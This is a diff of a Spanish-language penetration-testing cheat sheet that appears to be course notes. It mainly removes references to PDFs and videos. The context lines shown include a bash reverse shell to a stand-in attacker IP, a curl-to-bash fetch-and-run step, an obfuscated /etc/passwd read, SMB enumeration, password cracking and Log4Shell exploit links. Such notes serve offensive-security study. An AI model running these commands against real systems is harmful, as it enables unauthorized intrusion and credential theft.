@@ -27,8 +27,6 @@ sudo python -m SimpleHTTPServer 80
 sudo python smbserver.py [como se llamara el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/user
     Para conectarse: copy \\IP\recurso
 
-mas en.... FileTransfer-Win-Lin-Guide.pdf
-
 
 TRATAMIENTO TTY
 ...............
@@ -41,8 +39,6 @@ xterm
 export TERM=xterm
 export SHELL=bash
 stty rows 52 columns 187
-
-mas en.... tratamiento_tty.pdf
 
 
 FUZZING WEB
@@ -73,13 +69,10 @@ si no funciona....
     2.compartimos ese archivo mediante python -m....
     3.lo ejecutamos /usr/bin/curl IP/ARCHIVO|bash
 
-mas en... ShellsInversasCheatSheet.txt
 
 Los siguientes ejemplos suponen que la IP del atacante es 8.8.8.8 y utiliza el puerto 8080 para la conexión.
 Por lo tanto, en todos estos casos, debe escuchar el puerto 8080 con el siguiente comando:
 nc -vv -l -p 8080
-Más info en los videos 26 y 27 del curso.
-
 
 // Bash
 bash -i >& /dev/tcp/8.8.8.8/8080 0>&1
@@ -156,9 +149,7 @@ https://hackersonlineclub.com/sql-injection-cheatsheet/
 CRACKING PASSWORDS
 ...................
 
-john -wordlist /path/to/wordlist -users=users.txt hashfile
-
-mas en.... Practical_Password_Cracking.pdf
+john -wordlist /path/to/wordlist -format=[FORMATO] -users=users.txt hashfile
 
 
 HYDRA
@@ -184,8 +175,6 @@ smbclient -L IP -N
         smbget -R smb://IP/recurso
 
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
-
-mas en.... SMB_Enum&Exploitation.pdf
 
 
 NFS
@@ -219,20 +208,12 @@ cat
     extendido normal=c${HOA}at /etc/passwd
 
 
-
 METASPLOIT INIT
 ................
 
 sudo msfdb init
 sudo service postgresql start
 sudo msfconsole
-
-
-
-METERPRETER A SESION ESTABLE DE METERPRETER
-...........................................
-
-Ver el pdf meterpreter-to-stable.meterpreter.pdf
 
 
 TRATAMIENTO DE IMAGENES
@@ -301,6 +282,7 @@ VULNERABILIDAD LOG4J
 https://guglia001.github.io/cve/poc/articulo/log4j-CVE-POC/
 https://jmlgomez73.github.io/log4shell/
 https://github.com/fullhunt/log4j-scan
+
 
 ACTIVE DIRECTORY
 ................
